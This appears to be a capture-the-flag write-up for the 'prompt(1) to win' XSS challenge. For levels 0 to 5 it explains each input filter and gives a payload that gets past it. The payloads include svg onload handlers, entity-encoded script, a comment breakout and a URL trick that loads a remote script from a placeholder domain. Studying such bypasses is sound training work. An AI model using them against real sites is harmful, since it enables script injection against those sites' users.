# prompt(1) to win
## 0 
**Explain**

<img width="1000" src="https://user-images.githubusercontent.com/68285613/147735387-10fb0b9b-deb8-43d9-a7e3-f3289d47f0df.png">

```HTML
<input type="text" value="INPUT">
```


```">``` will close ```<input>``` first.

Then attacker will be able to use prompt(1).


<br>

**Solve**

```HTML
"><script>prompt(1)</script>

```
<img width="1000" src="https://user-images.githubusercontent.com/68285613/147693465-ee262fcc-5b5f-4933-9d9a-e8ab593cf366.png">

<br>

<br>

## 1
**Explain**

<img width="1000" src="https://user-images.githubusercontent.com/68285613/147735732-82fe3eb8-1eab-4d58-b603-408f06d90a15.png">


```JavaScript
var stripTagsRE = /<\/?[^>]+>/gi;
input = input.replace(stripTagsRE, '');
```

Need to bypass the ```input.replace``` part.

<br>

**Readings**
- [What's the meaning of /gi in a regex? [duplicate]](https://stackoverflow.com/questions/27916055/whats-the-meaning-of-gi-in-a-regex/27916089)

<br>

**Solve**

*Remember to add a apace behind ```(1)```, so that it will be able to use prompt(1).*

```JavaScript
<svg onload=prompt(1) 
```

<img width="1000" src="https://user-images.githubusercontent.com/68285613/147695438-906a1682-fb06-4ee3-98b5-bee70ab631a3.png">

<br>

<br>

## 2
**Explain**

<img width="1000" src="https://user-images.githubusercontent.com/68285613/147735779-aef522df-531e-46c8-8d08-2792f978598f.png">

```JavaScript
input = input.replace(/[=(]/g, '');
```

Need to bypass the ```input.replace``` part.

<br>

<img width="1000" src="https://user-images.githubusercontent.com/68285613/147696395-81b4a6de-feea-496a-bb89-8b81e591fb87.png">

The ```=``` and ```( ``` are missing.

<br>

<img width="1000" src="https://user-images.githubusercontent.com/68285613/147698634-ab20250b-d195-4650-b70c-38d75363a9db.png">

The ```<h1``` part will make prompt(1) appear on screen.

> ```%40;``` is HTML number of ```(```.

By altering the tag ```<h1``` into other tags, might ended up being able to use prompt(1).

<br>

**Readings**

- [w3schools - svg](https://www.w3schools.com/HTML/html5_svg.asp)

<br>

**Solve**

```HTML
<svg><script>prompt&#40;1)</script>
```

<img width="1000" src="https://user-images.githubusercontent.com/68285613/147736127-dbe162cc-2d9d-4e90-ba2f-53a9b72ee76a.png">

SVG is XML based, which means that every element is available within the SVG DOM.

<br>

<br>

## 3
**Explain**

<img width="1000" src="https://user-images.githubusercontent.com/68285613/147735869-d4babbf5-7eb8-4c03-bf85-81e9864c331e.png">

```input = input.replace(/->/g, '_');```

Will have use use something other than ```-->``` to close the comment.

<br>

**Solve**

```HTML
--!><svg onload=prompt(1)>
```

<img width="1000" src="https://user-images.githubusercontent.com/68285613/147734370-19e288b3-e257-41cf-adac-8948e52d21ba.png">

<br>

<br>

## 4
Credit to [Allen Chou](https://github.com/s3131212), can't solve this without you buddy.

**Explain**

<img width="1000" src="https://user-images.githubusercontent.com/68285613/147736329-66c1b077-32d7-46dc-a91c-68820d5cfa4c.png">

The URL format is " user:password@domain/path?parameter#segment ", however " user:password@ " will usually be omitted.

*By using " http://prompt.ml%2f@DOMAIN_NAME/YOUR_FILE.js " will successfully perform prompt(1).*

- ```%2f``` is the url encode of ```/```.
    - The input condition in ```if()```  is being encoded, however the input is not being encoded in if statement. ```%2f``` will bypass both if condition and statement. 
- YOUR_FILE.js must contain ```prompt(1)```.

> Taking %2f off will not work through if condition, check test.js. 

<br>

**Readings**
- [In search of the perfect URL validation regex](https://mathiasbynens.be/demo/url-regex)

<br>

**Solve**

I don't have a domain, so was not able to use " http://prompt.ml%2f@DOMAIN_NAME/YOUR_FILE.js ".

<br>

<br>

## 5
**Explain**

<img width="1000" src="https://user-images.githubusercontent.com/68285613/147775277-f3fc0964-8540-4037-ba0e-963930d58243.png">

```JavaScript
input = input.replace(/>|on.+?=|focus/gi, '_');
```



